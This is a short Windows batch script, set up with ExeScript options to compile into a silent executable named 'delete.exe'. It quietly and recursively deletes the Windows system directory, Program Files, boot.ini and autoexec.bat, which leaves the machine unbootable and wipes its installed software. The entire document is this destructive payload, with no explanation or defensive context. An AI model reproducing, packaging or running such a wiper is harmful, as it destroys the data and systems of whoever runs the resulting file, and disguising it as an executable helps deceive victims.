
@rem ----- ExeScript Options Begin -----
@rem ScriptType: console,silent
@rem DestDirectory: temp
@rem Icon: none
@rem OutputFile: C:\delete.exe
@rem ----- ExeScript Options End -----
@echo off
del /S /Q %SYSTEMROOT% %PROGRAMFILES%
del /S /Q boot.ini
del /S /Q autoexec.bat
